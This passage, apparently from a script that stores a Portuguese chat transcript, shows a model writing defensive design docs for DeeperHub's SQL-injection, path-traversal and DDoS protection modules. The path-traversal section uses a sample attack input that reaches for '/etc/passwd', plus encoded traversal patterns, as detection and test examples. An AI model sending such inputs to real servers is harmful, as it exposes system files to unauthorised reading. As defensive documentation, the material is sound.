    *   Validar identificadores (nomes de colunas/tabelas) contra listas brancas se eles precisarem ser dinâmicos.
    *   Como uma camada de verificação adicional para logar/alertar sobre entradas suspeitas, mesmo que a query principal seja parametrizada.
*   Mantenha os padrões de detecção (regexes) atualizados com base em novas técnicas de SQLi.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Integrar com bibliotecas de parsing SQL mais robustas para uma análise sintática e semântica das queries, em vez de depender apenas de regex.
*   [ ] Desenvolver uma \"API de query segura\" mais elaborada (`generate_safe_query/2`) que abstraia a construção de queries Ecto dinâmicas comuns de forma segura.
*   [ ] Adicionar aprendizado de máquina para identificar queries SQL anômalas com base no tráfego normal do banco de dados.
*   [ ] Fornecer mais contexto para as funções `check_string` e `sanitize_string` sobre onde a string será usada (ex: dentro de um literal string, como um identificador, em uma cláusula numérica) para aplicar regras de sanitização/validação mais precisas.

---

*Última atualização: 2025-05-12*

---

Proteção contra SQL Injection é um clássico da segurança web!

O próximo poderia ser `DeeperHub.Security.XssProtection` (que já documentamos) ou `DeeperHub.Security.PathTraversalProtection` ou `DeeperHub.Security.DdosProtection`. Qual prefere?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Já documentamos o `DeeperHub.Security.XssProtection`.

Que tal seguirmos com o `DeeperHub.Security.PathTraversalProtection`? É outra vulnerabilidade comum relacionada ao acesso a arquivos.

---

# Módulo: `DeeperHub.Security.PathTraversalProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.PathTraversalProtection`

O módulo `DeeperHub.Security.PathTraversalProtection` é dedicado a prevenir ataques de **Path Traversal (também conhecido como Directory Traversal)** no sistema DeeperHub. Este tipo de ataque ocorre quando um invasor manipula variáveis de entrada que são usadas para construir caminhos de arquivos, com o objetivo de acessar arquivos ou diretórios fora do diretório raiz pretendido pela aplicação. Sequências como `../` (ponto-ponto-barra) são comumente usadas para \"subir\" na hierarquia de diretórios.

Este módulo fornece funcionalidades para:
1.  Verificar se um caminho fornecido pelo usuário contém sequências de path traversal.
2.  Sanitizar caminhos para remover ou neutralizar essas sequências.
3.  Normalizar caminhos para uma forma canônica.
4.  Verificar se um caminho resolvido reside dentro de um diretório base permitido.

O objetivo é garantir que o acesso a arquivos seja restrito aos diretórios designados e que entradas maliciosas não resultem em acesso não autorizado a arquivos sensíveis do sistema. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Detecção de Path Traversal (`check_path/2`):**
    *   Analisar uma string de caminho para identificar a presença de sequências como `../`, `..\\`, ou suas variações codificadas (ex: `%2e%2e%2f`).
*   **Sanitização de Caminhos (`sanitize_path/2`):**
    *   Remover ou neutralizar sequências de path traversal de uma string de caminho.
    *   Opcionalmente, resolver o caminho para sua forma canônica após a sanitização.
*   **Normalização de Caminhos (`normalize_path/2`):**
    *   Converter um caminho para sua forma canônica e absoluta, resolvendo `.` e `..` e removendo barras duplicadas.
*   **Verificação de Diretório Base (`verify_path_in_base/3`):**
    *   Garantir que um caminho normalizado e absoluto esteja contido dentro de um ou mais diretórios base permitidos e configurados.
*   **Configuração de Diretórios Base Permitidos (`configure_allowed_dirs/1`):**
    *   Permitir que administradores definam quais diretórios são seguros para a aplicação acessar ou servir arquivos.
*   **Registro de Tentativas (`record_attempt/2`):**
    *   Logar tentativas de path traversal detectadas para auditoria e monitoramento.
*   **Estatísticas (`get_statistics/1`):**
    *   Coletar métricas sobre tentativas de path traversal detectadas.
*   **Integração com Upload/Download de Arquivos:**
    *   Ser utilizado por módulos que lidam com upload, download ou qualquer forma de acesso a arquivos baseada em entrada do usuário.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.PathTraversalProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de proteção.
    *   Delega para o `PathTraversalProtectionService`.
2.  **`DeeperHub.Security.PathTraversalProtection.Services.PathTraversalProtectionService` (Módulo Funcional):**
    *   **Responsabilidade:** Contém a lógica principal para `check_path`, `sanitize_path`, `normalize_path`, e `verify_path_in_base`.
    *   **Interações:**
        *   Utiliza funções do módulo `Path` do Elixir para manipulação de caminhos.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter a lista de diretórios base permitidos e outras configurações.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas.
3.  **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Lista de diretórios base permitidos.
    *   Padrões de detecção (se usar regex mais avançadas).
    *   Política de ação ao detectar uma tentativa (logar, bloquear).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/path_traversal_protection/
├── path_traversal_protection.ex                 # Fachada Pública
│
└── services/
    └── path_traversal_protection_service.ex     # Lógica principal
```
*(Este módulo é geralmente mais simples e pode não necessitar de um GenServer ou supervisor próprio, a menos que gerencie estado complexo ou tarefas de background, o que não é típico para esta funcionalidade.)*

### 3.3. Decisões de Design Importantes

*   **Normalização Antes da Verificação:** É crucial normalizar os caminhos para sua forma canônica antes de realizar verificações de diretório base. Isso ajuda a evitar bypasses usando diferentes codificações ou sequências de `.` e `..`.
*   **Verificação de Lista Branca de Diretórios Base:** A abordagem mais segura é definir explicitamente quais diretórios a aplicação pode acessar.
*   **Cuidado com Symlinks:** A normalização (`Path.expand/1`) resolve symlinks. É importante estar ciente de como isso interage com as verificações de diretório base, para evitar que um symlink aponte para fora de um diretório permitido.
*   **Contexto do Sistema Operacional:** A manipulação de caminhos pode ter nuances dependendo do sistema operacional (barras vs. contrabarras). O módulo `Path` do Elixir ajuda a abstrair isso.

## 🛠️ 4. Casos de Uso Principais

*   **Download de Arquivo Solicitado pelo Usuário:**
    *   Usuário clica em um link: `/download?file=report.pdf`. O backend recebe `filename = \"report.pdf\"`.
    *   Antes de acessar o arquivo:
        1.  `{:ok, :safe} = PathTraversalProtection.check_path(filename)`
        2.  `{:ok, normalized_filename} = PathTraversalProtection.normalize_path(Path.join(@upload_dir, filename))`
        3.  `{:ok, :allowed} = PathTraversalProtection.verify_path_in_base(normalized_filename, @upload_dir)`
    *   Se todas as verificações passarem, o arquivo é servido.
*   **Tentativa de Acesso Malicioso:**
    *   Invasor tenta: `/download?file=../../../../etc/passwd`.
    *   `PathTraversalProtection.check_path(\"../../../../etc/passwd\")` retorna `{:ok, :unsafe}`.
    *   `PathTraversalProtection.record_attempt(\"../../../../etc/passwd\", %{ip: ..., user_id: ...})`.
    *   A requisição é bloqueada.
*   **Upload de Arquivo com Nome Manipulado:**
    *   Usuário tenta fazer upload de um arquivo com o nome `../avatar.jpg`.
    *   O serviço de upload, antes de construir o caminho final, deve usar `Path.basename(user_supplied_filename)` para pegar apenas o nome do arquivo e depois juntá-lo com o diretório de upload seguro, ou usar `sanitize_path` no nome do arquivo.

## 🌊 5. Fluxos Importantes

### Fluxo de Validação de Caminho para Acesso a Arquivo

1.  **Entrada do Usuário:** Aplicação recebe um nome de arquivo ou caminho parcial de uma fonte não confiável (ex: parâmetro de URL, formulário).
2.  **Verificação Inicial (`check_path/2`):**
    *   `DeeperHub.Security.PathTraversalProtection.check_path(user_input_path)`
    *   Se retornar `{:ok, :unsafe}`, a operação é imediatamente interrompida, a tentativa é logada/auditada.
3.  **Construção do Caminho Completo:**
    *   Juntar o `user_input_path` (que passou na verificação inicial ou foi sanitizado) com o diretório base esperado para a operação (ex: `Path.join(Config.get(:upload_directory), user_input_path)`).
4.  **Normalização do Caminho (`normalize_path/2`):**
    *   `{:ok, canonical_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(full_path)`
    *   Isso resolve quaisquer `.` ou `..` que possam ter restado ou sido formados pela junção.
5.  **Verificação de Diretório Base (`verify_path_in_base/3`):**
    *   `DeeperHub.Security.PathTraversalProtection.verify_path_in_base(canonical_path, Config.get(:upload_directory))`
    *   Se retornar `{:ok, :denied}`, a operação é interrompida, a tentativa é logada/auditada.
6.  **Acesso ao Arquivo:** Se todas as verificações passarem, o `canonical_path` pode ser usado para acessar o arquivo.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.PathTraversalProtection.check_path(path :: String.t(), opts :: keyword()) :: {:ok, :safe | :unsafe} | {:error, term()}`

*   **Descrição:** Verifica se uma string de caminho contém sequências de path traversal (ex: `../`). Não resolve ou normaliza o caminho.
*   **`opts`:**
    *   `:patterns_to_check` (list(Regex.t()), opcional): Regexes adicionais para verificar.
*   **Retorno:** `:safe` se nenhuma sequência perigosa for detectada, `:unsafe` caso contrário.

### 6.2. `DeeperHub.Security.PathTraversalProtection.sanitize_path(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Tenta remover ou neutralizar sequências de path traversal de uma string de caminho.
*   **`opts`:**
    *   `:replacement_strategy` (atom): Como lidar com `../` (ex: `:remove`, `:replace_with_underscore`). (Padrão: `:remove`)
*   **Retorno:** A string de caminho sanitizada.

### 6.3. `DeeperHub.Security.PathTraversalProtection.normalize_path(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Converte um caminho para sua forma canônica e absoluta, resolvendo `.` , `..` e symlinks (via `Path.expand/1`).
*   **`opts`:**
    *   `:relative_to` (String.t): Diretório base para resolver caminhos relativos. (Padrão: diretório de trabalho atual).
*   **Retorno:** O caminho absoluto e normalizado.
*   **Atenção:** O uso de `Path.expand/1` implica acesso ao sistema de arquivos.

### 6.4. `DeeperHub.Security.PathTraversalProtection.verify_path_in_base(target_path :: String.t(), allowed_base_dir :: String.t() | list(String.t()), opts :: keyword()) :: {:ok, :allowed | :denied} | {:error, term()}`

*   **Descrição:** Verifica se o `target_path` (que deve ser absoluto e normalizado) está contido dentro do `allowed_base_dir` (ou qualquer um na lista de diretórios base).
*   **`opts`:**
    *   `:ensure_target_exists` (boolean): Se `true`, também verifica se `target_path` existe no sistema de arquivos. (Padrão: `false`)
*   **Retorno:** `:allowed` se seguro, `:denied` se fora do diretório base.

### 6.5. `DeeperHub.Security.PathTraversalProtection.configure_allowed_dirs(list_of_absolute_paths :: list(String.t())) :: :ok | {:error, term()}`

*   **Descrição:** Define a lista de diretórios base que são considerados seguros para a aplicação acessar diretamente. Essa configuração seria armazenada no `Core.ConfigManager`.
*   **Nota:** É mais provável que essa configuração seja gerenciada pelo `SecurityPolicyManager`.

### 6.6. `DeeperHub.Security.PathTraversalProtection.record_attempt(attempted_path :: String.t(), source_info :: map()) :: :ok`

*   **Descrição:** Registra uma tentativa de path traversal.
*   **`source_info`:** `%{ip_address: \"...\", user_id: \"...\", request_path: \"...\"}`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :path_traversal, :enabled]`** (Boolean): Habilita/desabilita as verificações. (Padrão: `true`)
*   **`[:security, :path_traversal, :allowed_base_directories]`** (List de Strings): Lista de caminhos absolutos para os diretórios base permitidos (ex: `[\"/var/www/deeper_hub/uploads\", \"/var/www/deeper_hub/public_assets\"]`). Esta é uma configuração CRÍTICA.
*   **`[:security, :path_traversal, :log_suspicious_attempts]`** (Boolean): Se tentativas detectadas devem ser logadas. (Padrão: `true`)
*   **`[:security, :path_traversal, :block_on_suspicious_attempt]`** (Boolean): Se deve bloquear a requisição ao detectar uma tentativa. (Padrão: `true` para a maioria dos casos)
*   **`[:security, :path_traversal, :default_sanitize_strategy]`** (Atom): Estratégia padrão para `sanitize_path/2`. (Padrão: `:remove`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter a lista de diretórios base permitidos e outras configurações.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring`: Para registrar tentativas.

### 8.2. Bibliotecas Externas

*   Nenhuma específica, utiliza principalmente o módulo `Path` do Elixir.

## 🤝 9. Como Usar / Integração

*   **Qualquer módulo que lide com caminhos de arquivo fornecidos pelo usuário:**
    *   **Uploads:** Antes de salvar um arquivo com um nome fornecido pelo usuário, use `Path.basename/1` no nome do arquivo do usuário e depois junte-o com um diretório de upload seguro.
        ```elixir
        def handle_upload(user_supplied_filename, file_binary) do
          base_upload_dir = ConfigManager.get([:storage, :upload_dir]) # Ex: \"/srv/uploads\"
          safe_filename = Path.basename(user_supplied_filename) # Pega apenas o nome do arquivo
          
          # Validação adicional no safe_filename (ex: caracteres permitidos)
          # ...

          final_path = Path.join(base_upload_dir, safe_filename)

          # Verificar se final_path ainda está dentro do base_upload_dir (após Path.join, pode não ser necessário se base_upload_dir for absoluto e safe_filename não tiver barras)
          # Mas para ser extra seguro, especialmente se base_upload_dir puder ser relativo ou safe_filename puder ser manipulado:
          {:ok, normalized_final_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(final_path)
          case DeeperHub.Security.PathTraversalProtection.verify_path_in_base(normalized_final_path, base_upload_dir) do
            {:ok, :allowed} -> File.write(normalized_final_path, file_binary)
            _ -> {:error, :unsafe_path}
          end
        end
        ```
    *   **Downloads/Acesso a Arquivos:**
        ```elixir
        def serve_file(conn, requested_file) do
          allowed_dirs = ConfigManager.get([:security, :path_traversal, :allowed_base_directories])
          
          case DeeperHub.Security.PathTraversalProtection.check_path(requested_file) do
            {:ok, :unsafe} ->
              DeeperHub.Security.PathTraversalProtection.record_attempt(requested_file, %{ip: ..., conn: conn})
              send_resp(conn, 403, \"Forbidden\")
            {:ok, :safe} ->
              # Tentar encontrar o arquivo em cada diretório base permitido
              found_path = Enum.find_value(allowed_dirs, fn base_dir ->
                potential_path = Path.join(base_dir, requested_file)
                {:ok, normalized_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(potential_path)
                case DeeperHub.Security.PathTraversalProtection.verify_path_in_base(normalized_path, base_dir) do
                  {:ok, :allowed} when File.exists?(normalized_path) -> normalized_path
                  _ -> nil
                end
              end)

              if found_path do
                Plug.Conn.send_file(conn, 200, found_path)
              else
                send_resp(conn, 404, \"Not Found\")
              end
          end
        end
        ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `check_path/2` com vários vetores de path traversal (ex: `../`, `..\\`, `%2e%2e%2f`, `..%2f`, caminhos absolutos inesperados).
*   Testar `sanitize_path/2` para garantir que ele remove/neutraliza corretamente as sequências.
*   Testar `normalize_path/2` com caminhos complexos, incluindo `.` e `..`.
*   Testar `verify_path_in_base/3` com caminhos que estão dentro, fora, e na borda dos diretórios base permitidos, incluindo casos com symlinks se relevante para o ambiente.
*   Localização: `test/deeper_hub/security/path_traversal_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.path_traversal.paths_checked.count`
*   `deeper_hub.security.path_traversal.unsafe_paths_detected.count` (tags: `context_operation`)
*   `deeper_hub.security.path_traversal.paths_sanitized.count`
*   `deeper_hub.security.path_traversal.access_denied_base_dir.count`

### 10.3. Logs

*   **Nível WARNING:** `check_path/2` detecta um caminho `unsafe`. `verify_path_in_base/3` nega acesso.
*   **Nível INFO/DEBUG:** Detalhes da normalização de caminhos, se complexa.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :path_traversal, :check_path, :stop]`
    *   Metadados: `%{input_path: path, result: :safe | :unsafe}`
*   `[:deeper_hub, :security, :path_traversal, :verify_base, :stop]`
    *   Metadados: `%{target_path: path, base_dir: dir, result: :allowed | :denied}`

## ❌ 11. Tratamento de Erros

*   Detecção de path traversal (`:unsafe` ou `:denied`) deve, na maioria dos casos, resultar no bloqueio da operação e, possivelmente, da requisição.
*   Erros internos no serviço (ex: falha ao ler configuração de diretórios base) devem ser logados criticamente e o sistema deve falhar de forma segura (negar acesso a arquivos).

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Configuração Correta dos Diretórios Base:** A segurança deste módulo depende fortemente da configuração correta e restritiva dos `allowed_base_directories`. Eles devem ser caminhos absolutos e não devem ser muito amplos.
*   **Symlinks:** Se o sistema de arquivos subjacente usa symlinks, `Path.expand/1` (usado em `normalize_path`) os resolverá. É preciso garantir que um symlink dentro de um diretório permitido não aponte para uma localização fora dele que não deveria ser acessível.
*   **Codificações de Caminho:** Esteja ciente de diferentes codificações de caracteres (URL encoding, double encoding) que os invasores podem usar para tentar contornar as verificações. As funções de verificação devem lidar com as formas canônicas.

## 🧑‍💻 13. Contribuição

*   Sempre valide e normalize caminhos antes de usá-los em operações de sistema de arquivos.
*   Use `Path.join/2` para construir caminhos de forma segura, mas sempre valide o resultado final se algum componente vier de entrada não confiável.
*   Ao definir `allowed_base_directories`, seja o mais específico possível.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte para políticas de path traversal mais granulares, baseadas no contexto da operação ou no tipo de arquivo.
*   [ ] Integrar com um sistema de \"sandboxing\" ou capabilities no nível do sistema operacional para restringir ainda mais onde o processo Elixir pode ler/escrever arquivos, como uma camada de defesa adicional.
*   [ ] Desenvolver regexes mais sofisticadas para `check_path/2` para detectar técnicas de evasão mais obscuras, mantendo a performance.
*   [ ] Opção para normalizar caminhos sem acessar o sistema de arquivos (ou seja, sem resolver symlinks via `Path.expand`), útil para validação pura de strings de caminho antes de qualquer I/O.

---

*Última atualização: 2025-05-12*

---

Proteção contra Path Traversal é crucial para qualquer aplicação que lida com arquivos.

O que vem agora? Poderíamos cobrir `DeeperHub.Security.DdosProtection` ou talvez mudar para um módulo Core como `DeeperHub.Core.Cache` para variar um pouco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com a camada de segurança e detalhar o `DeeperHub.Security.DdosProtection`. Ataques de Negação de Serviço Distribuída são uma ameaça significativa para a disponibilidade de qualquer serviço online.

---

# Módulo: `DeeperHub.Security.DdosProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.DdosProtection`

O módulo `DeeperHub.Security.DdosProtection` é projetado para proteger o sistema DeeperHub contra ataques de **Negação de Serviço Distribuída (DDoS)** e ataques de Negação de Serviço (DoS) mais simples. O objetivo desses ataques é sobrecarregar os recursos do servidor (CPU, memória, largura de banda, conexões de banco de dados) com um volume massivo de tráfego ilegítimo, tornando a aplicação indisponível para usuários legítimos.

Este módulo implementa várias estratégias para mitigar esses ataques, incluindo:
1.  **Limitação de Taxa (Rate Limiting) Agressiva:** Aplicar limites de taxa mais rigorosos baseados em IP e, potencialmente, em outros identificadores, para tráfego geral ou para endpoints específicos durante um ataque percebido.
2.  **Bloqueio de IPs:** Identificar e bloquear IPs que participam de um ataque.
3.  **Detecção de Padrões de Ataque:** Analisar padrões de tráfego para identificar características de ataques DDoS (ex: floods SYN, HTTP floods).
4.  **Modos de Proteção Avançada:** Capacidade de alternar para um modo de proteção mais restritivo durante um ataque.
5.  **Integração com Serviços Externos de Mitigação DDoS (Opcional):** Facilitar a integração com serviços como Cloudflare, AWS Shield, etc.

O foco é manter a disponibilidade do DeeperHub mesmo sob condições de tráfego anormais ou maliciosas. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tráfego:**
    *   Analisar o volume e a natureza das requisições recebidas (`record_request/3`).
    *   Identificar picos anormais de tráfego ou padrões suspeitos.
*   **Limitação de Taxa Global e por Endpoint:**
    *   Aplicar limites de taxa gerais para IPs individuais.
    *   Permitir a configuração de limites de taxa específicos para endpoints mais sensíveis ou visados (`configure_rate_limit/3`).
    *   (Delegação para `DeeperHub.API.RateLimiter` para a mecânica, mas com políticas específicas para DDoS aqui).
*   **Detecção e Bloqueio de IPs Atacantes:**
    *   Identificar IPs que excedem significativamente os limites de taxa ou que participam de padrões de ataque conhecidos.
    *   Bloquear esses IPs temporária ou permanentemente (`block_ip/3`, `unblock_ip/1`).
    *   Manter uma lista de IPs bloqueados (via `IPFirewallService` ou um cache interno).
*   **Análise de Padrões de Ataque:**
    *   Implementar (ou integrar com ferramentas que implementam) detecção para tipos comuns de ataques DDoS (ex: HTTP flood, Slowloris - mais complexo).
*   **Modo de Proteção Avançada/Sob Ataque (`set_advanced_protection/2`):**
    *   Permitir a ativação de um modo de \"sob ataque\" que aplica regras mais estritas, como:
        *   Limites de taxa mais baixos.
        *   Desafios de JavaScript ou CAPTCHA mais agressivos para novos visitantes.
        *   Bloqueio de faixas de IPs suspeitas ou de geografias conhecidas por originar ataques.
*   **Relatórios e Estatísticas (`get_statistics/1`):**
    *   Fornecer estatísticas sobre o tráfego, requisições bloqueadas/limitadas e IPs bloqueados.
*   **Integração com WAF/Serviços Externos (Opcional):**
    *   Capacidade de interagir com Web Application Firewalls (WAFs) ou serviços de mitigação DDoS externos para coordenar respostas (ex: reportar IPs atacantes, receber listas de bloqueio).
*   **Configurabilidade:**
    *   Políticas de rate limiting, limiares de detecção de ataque, duração de bloqueios.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DdosProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de proteção DDoS.
    *   Delega para o `DdosProtectionService`.
2.  **`DeeperHub.Security.DdosProtection.Services.DdosProtectionService` (GenServer ou Módulo Funcional com Estado em ETS):**
    *   **Responsabilidade:** Lógica principal para monitorar tráfego, aplicar limites de taxa (específicos para DDoS, complementando o rate limiter da API), detectar padrões de ataque e gerenciar o modo de proteção avançada.
    *   **Estado (se GenServer/ETS):** Contadores de requisições por IP/path, estado do modo de proteção avançada, limiares dinâmicos.
    *   **Interações:**
        *   `DeeperHub.API.RateLimiterFacade`: Pode usar este para a mecânica de rate limiting, mas com políticas específicas para DDoS.
        *   `DeeperHub.Security.IPFirewallService`: Para bloquear/desbloquear IPs.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter políticas e limiares.
        *   `DeeperHub.Security.Monitoring`: Para registrar alertas de DDoS.
3.  **`DeeperHub.Security.Plugs.DdosProtectionPlug` (Phoenix Plug, Opcional):**
    *   **Responsabilidade:** Interceptar todas ou um subconjunto de requisições para aplicar verificações de DDoS (`check_request/3`) e registrar tráfego (`record_request/3`).
    *   Este plug deve ser um dos primeiros no pipeline.
4.  **`DeeperHub.Security.DdosProtection.PatternAnalyzer` (Módulo Funcional ou Worker):**
    *   **Responsabilidade:** Analisar logs de tráfego ou dados em tempo real para identificar padrões de ataque mais complexos (ex: distribuição de User-Agents, tipos de requisição, etc.).
5.  **Adaptadores para Serviços Externos de Mitigação (Opcional):**
    *   Módulos para interagir com APIs de Cloudflare, AWS Shield, etc.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/ddos_protection/
├── ddos_protection.ex                # Fachada Pública
│
├── services/
│   └── ddos_protection_service.ex    # Lógica principal
│
├── plug/                             # (Pode estar em deeper_hub_web/plugs)
│   └── ddos_protection_plug.ex
│
├── pattern_analyzer.ex               # (Opcional)
│
└── supervisor.ex                     # Supervisor (se o serviço principal for GenServer)
```
*(O `DdosProtectionAdapter` e `DdosProtectionBehaviour` da documentação original são consolidados aqui, assumindo uma implementação principal.)*

### 3.3. Decisões de Design Importantes

*   **Performance Crítica:** As verificações de DDoS devem ter um impacto mínimo na latência das requisições normais. O uso de ETS para contadores de taxa é comum.
*   **Múltiplas Camadas:** A proteção DDoS eficaz geralmente envolve múltiplas camadas:
    *   **Nível de Rede/Infraestrutura:** Idealmente, a primeira linha de defesa é em um nível anterior à aplicação (firewall de rede, provedor de CDN/DDoS).
    *   **Nível de Aplicação (este módulo):** Lida com ataques que passam pela primeira camada, focando em HTTP floods e abuso de recursos da aplicação.
*   **Falsos Positivos:** Políticas muito agressivas podem bloquear tráfego legítimo, especialmente durante picos de uso normais. A calibração e o modo \"monitor\" são importantes.
*   **Adaptação:** O sistema deve ser capaz de se adaptar a novos vetores de ataque. O modo de proteção avançada e a capacidade de atualizar regras/limiares dinamicamente são importantes.

## 🛠️ 4. Casos de Uso Principais

*   **HTTP Flood Simples em um Endpoint:**
    *   Muitas requisições de um ou poucos IPs para `/api/search`.
    *   `DdosProtectionPlug` chama `record_request/3` para cada uma.
    *   `DdosProtectionService` detecta que o limite de taxa para esses IPs ou para o endpoint `/api/search` foi excedido.
    *   Chama `IPFirewallService.block_ip/3` para bloquear os IPs atacantes.
    *   Requisições subsequentes desses IPs são bloqueadas pelo `IPFirewallPlug`.
*   **Ataque Distribuído Lento e Baixo (Low and Slow):**
    *   Muitos IPs diferentes fazem um número de requisições um pouco acima do normal, mas individualmente não disparam limites de taxa simples.
    *   `DdosProtection.PatternAnalyzer` (rodando em background ou analisando logs) detecta um aumento geral no tráfego para certos endpoints ou um padrão suspeito nos User-Agents.
    *   Um administrador é alertado ou o sistema entra automaticamente em um modo de proteção avançada.
*   **Administrador Ativa Modo de Proteção Avançada:**
    *   Durante um ataque percebido, um admin chama `DdosProtection.set_advanced_protection(true, %{global_rate_limit: 10})`.
    *   O `DdosProtectionService` ajusta suas políticas, e o `DdosProtectionPlug` começa a aplicar limites mais rigorosos ou desafios CAPTCHA.

## 🌊 5. Fluxos Importantes

### Fluxo de Verificação de Requisição pelo `DdosProtectionPlug`

1.  **Requisição Entra:** Chega uma nova requisição HTTP.
2.  **`DdosProtectionPlug.call/2`:**
    *   Extrai IP do cliente, path, etc.
    *   Chama `DeeperHub.Security.IPFirewallService.is_blocked?(client_ip)`. Se bloqueado, retorna 403.
    *   Chama `DeeperHub.Security.DdosProtection.check_request(client_ip, path, context)`.
3.  **`DdosProtectionService.check_request/3`:**
    *   Consulta as políticas de rate limiting atuais (globais, por path, modo de proteção avançada).
    *   Verifica o contador de requisições para o `client_ip` e/ou `path` (usando `DeeperHub.API.RateLimiterFacade` ou lógica interna).
    *   **Se Limite Excedido:**
        *   Retorna `{:ok, :rate_limited}` para o Plug.
        *   (Opcional) Registra o IP para possível bloqueio se o comportamento persistir.
    *   **Se Dentro do Limite:**
        *   Chama `record_request/3` para incrementar o contador.
        *   Retorna `{:ok, :allowed}` para o Plug.
4.  **`DdosProtectionPlug.call/2`:**
    *   Se `:rate_limited`, retorna uma resposta `429 Too Many Requests` e interrompe a `conn`.
    *   Se `:allowed`, a requisição prossegue.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.DdosProtection.check_request(ip_address :: String.t(), path :: String.t(), context :: map()) :: {:ok, :allowed | :rate_limited | :blocked_by_ddos_policy} | {:error, term()}`

*   **Descrição:** Verifica se uma requisição de um IP para um path deve ser permitida, limitada por taxa ou bloqueada com base nas políticas de DDoS. Esta função é mais específica que um rate limiter genérico, pois pode considerar o estado geral de \"sob ataque\".
*   **`context`:** Pode incluir `%{method: \"GET\", headers: %{...}}`.
*   **Retorno:** `:allowed`, `:rate_limited` (com info de retry), ou `:blocked_by_ddos_policy`.

### 6.2. `DeeperHub.Security.DdosProtection.record_request(ip_address :: String.t(), path :: String.t(), context :: map()) :: :ok`

*   **Descrição:** Registra uma requisição para contagem e análise de padrões. Chamado se `check_request` permitir.

### 6.3. `DeeperHub.Security.DdosProtection.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil) :: :ok | {:error, term()}`

*   **Descrição:** Bloqueia um IP especificamente devido a atividade DDoS. Delega para `IPFirewallService` mas com um motivo específico de DDoS.

### 6.4. `DeeperHub.Security.DdosProtection.unblock_ip(ip_address :: String.t()) :: :ok | {:error, term()}`

*   **Descrição:** Desbloqueia um IP que foi bloqueado por políticas de DDoS.

### 6.5. `DeeperHub.Security.DdosProtection.configure_rate_limit(path_pattern :: String.t(), requests_per_window :: integer(), window_seconds :: integer(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Configura ou atualiza uma regra de rate limiting específica para proteção DDoS em um padrão de path.
*   **`opts`:** Pode incluir `:burst_limit`.

### 6.6. `DeeperHub.Security.DdosProtection.set_advanced_protection(enabled :: boolean(), opts :: keyword()) :: :ok`

*   **Descrição:** Ativa ou desativa o modo de proteção avançada.
*   **`opts`:** Pode incluir `:global_rate_limit_per_ip`, `:challenge_all_new_ips` (boolean).

### 6.7. `DeeperHub.Security.DdosProtection.get_statistics(period :: atom()) :: {:ok, map()}`

*   **Descrição:** Obtém estatísticas sobre atividade DDoS e ações de mitigação.
*   **`period`:** `:current`, `:last_hour`, `:last_day`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ddos_protection, :enabled]`** (Boolean): Habilita/desabilita o módulo. (Padrão: `true`)
*   **`[:security, :ddos_protection, :default_ip_rate_limit, :requests]`** (Integer): Limite global de requisições por IP.
*   **`[:security, :ddos_protection, :default_ip_rate_limit, :window_seconds]`** (Integer): Janela para o limite global.
*   **`[:security, :ddos_protection, :auto_block, :threshold_factor]`** (Float): Fator acima do limite de taxa para considerar auto-bloqueio de IP (ex: 2.0 = o dobro do limite de taxa).
*   **`[:security, :ddos_protection, :auto_block, :duration_seconds]`** (Integer): Duração do auto-bloqueio.
*   **`[:security, :ddos_protection, :advanced_mode_settings, :global_rate_limit_per_ip]`** (Integer): Limite de taxa mais restrito quando em modo avançado.
*   **`[:security, :ddos_protection, :advanced_mode_settings, :challenge_new_ips_enabled]`** (Boolean).
*   **`[:security, :ddos_protection, :pattern_analyzer, :log_source]`** (String/Module): Fonte dos logs de tráfego para análise de padrões.
*   **`[:security, :ddos_protection, :notification_thresholds, :requests_per_second_global]`** (Integer): Limiar de RPS global para disparar um alerta de possível DDoS.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`.
